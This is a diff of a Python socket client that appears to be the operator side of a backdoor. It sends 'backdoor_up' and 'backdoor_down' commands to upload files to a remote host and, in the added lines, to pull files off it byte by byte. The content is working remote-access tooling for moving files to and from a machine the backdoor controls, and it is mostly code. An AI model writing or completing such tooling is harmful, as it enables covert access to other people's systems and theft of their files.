@@ -5,7 +5,7 @@ import argparse
 import struct
 
 p32 = lambda x : struct.pack("<i", x)
-up32 = lambda x : struct.unpack("<i", x)
+u32 = lambda x : struct.unpack("<i", x)
 
 '''
 mac_addr = input('MAC ADDR : ')
@@ -21,6 +21,8 @@ def chk_remote_path(socket,path):
 
     if b"No such file or directory" in data:
         sock.send(b'\x00')
+        print("[-] Path Doesn't Exist At Remote")
+        print("[-] Send File Fail")
         return False
     else:
         sock.send(b'\x01')
@@ -41,10 +43,9 @@ def send_file(socket,path,dst=None):
     socket.send(f"backdoor_up {dst}".encode())
 
     if chk_remote_path(socket,dst_dir_path)==False:
-        print("[-] Send File Fail")
         return -2
 
-    with open(path, 'rb') as f:
+    with open(path, "rb") as f:
         while True:
             data = f.read(10)
 
@@ -52,22 +53,32 @@ def send_file(socket,path,dst=None):
                 socket.send(p32(len(data)))
                 break
 
-            print(len(data))
-            print(data)
             socket.send(p32(len(data)))
             socket.send(data)
 
     
 def recv_file(socket,path,dst=None):
-    if chk_remote_path(socket, path)==False:
-        return -2
     if dst == None:
         dst = input("Destination Path : ")
     if chk_local_path(dst)==False:
         #make directory
         print("TBD")
-    
+        
     ### Recv file ###
+    socket.send(f"backdoor_down {path}".encode())
+
+    if chk_remote_path(socket, path)==False:
+        return -2
+
+    with open(dst, "ab") as f:
+        while True:
+            is_eof_flag = socket.recv(1)
+            
+            if is_eof_flag == b'\x00':
+                break
+
+            recv_data = socket.recv(1)
+            f.write(recv_data)
 
 
 def edit_file(socket,path):
